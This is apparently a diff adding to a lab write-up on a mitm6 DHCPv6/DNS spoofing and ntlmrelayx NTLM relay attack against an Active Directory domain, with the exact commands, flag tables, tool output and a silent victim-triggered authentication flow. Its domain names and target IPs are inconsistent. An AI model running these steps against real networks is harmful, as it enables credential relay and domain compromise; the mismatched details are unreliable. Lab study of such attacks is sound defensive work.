@@ -62,3 +62,113 @@ Create Domain User / Dump AD / Execute Commands
       ↓
 Domain Compromise
 ```
+
+## Lab Environment
+
+| Role                | OS                  | IP Address      |
+|---------------------|---------------------|-----------------|
+| Attacker            | Kali Linux          | 192.168.5.128   |
+| Domain Controller   | Windows Server 2019 | 192.168.5.134   |
+| Victim Workstation  | Windows 10          | 192.168.5.135   |
+
+**Domain Name:** `roadteambd.local`
+
+## Tools Required
+
+```
+|      Tool       |                  Purpose                           |
+|-----------------|----------------------------------------------------|
+| mitm6           | DHCPv6 spoofing + DNS hijacking                    |
+| ntlmrelayx.py   | NTLM authentication relay                          |
+| secretsdump.py  | Remote credential extraction from Active Directory |
+```
+
+# Attack Walkthrough
+## Step 1 — Start mitm6
+Open Terminal 1. Launch mitm6 targeting the internal domain on the network interface connected to the LAN.
+
+```bash
+sudo mitm6 -d roadteambd.local -i eth0
+```
+
+| Flag |           Meaning                 |
+|------|-----------------------------------|
+| sudo | Run with root privileges          |
+| mitm6| Starts IPv6 spoofing (DHCPv6/DNS) |
+| -d   | Target domain                     |
+| -i   | Network interface                 |
+| eth0| Active LAN interface              |
+
+### What Happens (mitm6 Flow)
+
+- `mitm6` listens for **DHCPv6 Solicit** packets from Windows hosts  
+- It replies with **DHCPv6 Advertise/Reply**, setting itself as the IPv6 DNS server  
+- Victim machines automatically update their DNS configuration  
+- All DNS queries are redirected to the attacker-controlled system  
+- `mitm6` responds to **WPAD and internal domain queries**, forcing traffic toward the attacker IP  
+
+
+## mitm6 output:
+
+```
+Starting mitm6 using the following configuration:
+Primary adapter: eth0 [00:0c:29:77:a3:b1]
+IPv4 address: 192.168.5.128
+IPv6 address: fe80::f0be:d0bb:2c16:64f0
+DNS local search domain: readteambd.local
+DNS allowlist: readteambd.local
+IPv6 address fe80::74:1 is now assigned to mac=00:50:56:c0:00:08 host=R64M. ipv4=
+IPv6 address fe80::192:168:5:134 is now assigned to mac=00:0c:29:bc:6b:1e host=REDTEAMBD-DC.READTEAMBD.local. ipv4=192.168.5.134
+Sent spoofed reply for wpad.readteambd.local. to fe80::502e:c6be:1fe9:c8bf
+```
+
+## Step 2 — Launch ntlmrelayx:
+On another terminal
+Run:
+
+```bash
+ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootme
+```
+```
+|             Flag              |                      Meaning                         |
+|-------------------------------|------------------------------------------------------|
+| ntlmrelayx.py                 | NTLM authentication relay                            |
+| -6                            | Enables listening on IPv6 as well as IPv4            |
+| -t ldaps://192.168.5.130      | Relay target (LDAPS on Domain Controller)            |
+| -wh fakewpad.readteambd.local | Serves a fake WPAD hostname to trigger authentication|
+|-l lootme                      | Saves all captured/dumped data to local directory    |
+```
+
+## ntlmrelayx startup output:
+
+```
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography import utils, x509
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+[*] Servers started, waiting for connections
+```
+
+## Step 3 — Trigger Authentication from Victim
+
+On the victim machine (Windows 10), simply restart the machine.
+Windows will automatically:
+
+- 1. Send a DHCPv6 Solicit — mitm6 responds
+- 2. Query DNS for WPAD — mitm6 answers, pointing to the attacker
+- 3. Windows attempts to fetch http://fakewpad.roadteambd.local/wpad.dat
+- 4. ntlmrelayx demands NTLM authentication
+- 5. Windows transparently authenticates using the logged-in user's credentials
+
+> *"No user interaction is required once the victim logs into Windows. The attack is completely silent."*
